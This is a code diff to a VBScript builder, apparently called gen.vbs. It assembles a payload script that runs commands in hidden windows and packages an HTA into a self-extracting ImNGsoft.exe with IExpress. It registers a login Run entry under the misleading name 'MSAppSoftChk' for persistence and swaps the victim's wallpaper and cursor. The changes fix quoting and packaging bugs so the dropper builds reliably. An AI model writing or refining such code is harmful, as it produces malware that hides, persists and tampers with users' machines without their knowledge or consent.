@@ -139,9 +139,9 @@ ts.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
 ts.WriteLine "Select Case m"
 ts.WriteLine "Case ""hide"""
 ts.WriteLine "    If WScript.Arguments.Count < 2 Then WScript.Quit"
-ts.WriteLine "    cmd = """""" & WScript.Arguments(1) & """""""
+ts.WriteLine "    cmd = Chr(34) & WScript.Arguments(1) & Chr(34)"
 ts.WriteLine "    For i = 2 To WScript.Arguments.Count - 1"
-ts.WriteLine "        cmd = cmd & "" """" & WScript.Arguments(i) & """""""
+ts.WriteLine "        cmd = cmd & "" "" & Chr(34) & WScript.Arguments(i) & Chr(34)"
 ts.WriteLine "    Next"
 ts.WriteLine "    sh.Run cmd, 0, False"
 ts.WriteLine "Case ""notice"""
@@ -225,16 +225,31 @@ ts.WriteLine "InsideCompressed=0"
 ts.WriteLine "CAB_FixedSize=0"
 ts.WriteLine "CAB_ResvCodeSigning=0"
 ts.WriteLine "RebootMode=N"
+ts.WriteLine "InstallPrompt=%InstallPrompt%"
+ts.WriteLine "DisplayLicense=%DisplayLicense%"
+ts.WriteLine "FinishMessage=%FinishMessage%"
+ts.WriteLine "TargetName=%TargetName%"
+ts.WriteLine "FriendlyName=%FriendlyName%"
+ts.WriteLine "AppLaunched=%AppLaunched%"
+ts.WriteLine "PostInstallCmd=%PostInstallCmd%"
+ts.WriteLine "AdminQuietInstCmd=%AdminQuietInstCmd%"
+ts.WriteLine "UserQuietInstCmd=%UserQuietInstCmd%"
+ts.WriteLine "SourceFiles=SourceFiles"
+ts.WriteLine "[Strings]"
 ts.WriteLine "InstallPrompt="
 ts.WriteLine "DisplayLicense="
 ts.WriteLine "FinishMessage="
-ts.WriteLine "TargetName=ImNGsoft.exe"
+ts.WriteLine "TargetName=" & build & "\ImNGsoft.exe"
 ts.WriteLine "FriendlyName=ImNGsoft"
 ts.WriteLine "AppLaunched=mshta.exe ImNGsoft.hta"
 ts.WriteLine "PostInstallCmd=<None>"
-ts.WriteLine "AppDir="
+ts.WriteLine "AdminQuietInstCmd="
+ts.WriteLine "UserQuietInstCmd="
 ts.WriteLine "FILE0=ImNGsoft.hta"
-ts.WriteLine "[Strings]"
+ts.WriteLine "[SourceFiles]"
+ts.WriteLine "SourceFiles0=" & build & "\"
+ts.WriteLine "[SourceFiles0]"
+ts.WriteLine "%FILE0%="
 ts.Close
 If Err.Number <> 0 Then Die "ImNGsoft.sed"
 
@@ -248,11 +263,14 @@ If Err.Number <> 0 Then Die "NCursor.cur"
 ie = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\iexpress.exe"
 If Not fso.FileExists(ie) Then ie = "iexpress"
 sh.CurrentDirectory = build
-sh.Run """" & ie & """ /n /q ImNGsoft.sed", 0, True
+sh.Run """" & ie & """ /n /q """ & build & "\ImNGsoft.sed""", 0, True
 If Not fso.FileExists(build & "\ImNGsoft.exe") Then
-    MsgBox "iexpress did not produce ImNGsoft.exe.", vbExclamation, "gen.vbs"
-Else
+    sh.Run """" & ie & """ /n """ & build & "\ImNGsoft.sed""", 1, True
+End If
+If fso.FileExists(build & "\ImNGsoft.exe") Then
     fso.CopyFile build & "\ImNGsoft.exe", DEST & "\ImNGsoft.exe", True
+Else
+    MsgBox "iexpress did not produce ImNGsoft.exe.", vbExclamation, "gen.vbs"
 End If
 
 ' ============================================================ registry
@@ -280,6 +298,13 @@ sh.RegWrite RK & "\MSAppSoftChk", "wscript.exe """ & DEST & "\payload.vbs"" hide
 If Err.Number <> 0 Then Die "Run"
 
 sh.Run "rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True", 0, True
+
+' ============================================================ verify
+If Not (fso.FileExists(DEST & "\Start.bat") And fso.FileExists(DEST & "\CheckSoft.bat") _
+    And fso.FileExists(DEST & "\payload.vbs") And fso.FileExists(DEST & "\RedWallPaper.bmp") _
+    And fso.FileExists(DEST & "\NCursor.cur") And fso.FileExists(DEST & "\ImNGsoft.exe")) Then
+    MsgBox "Some files are missing in " & DEST, vbExclamation, "gen.vbs"
+End If
 
 ' ============================================================ cleanup + run
 fso.DeleteFolder build, True
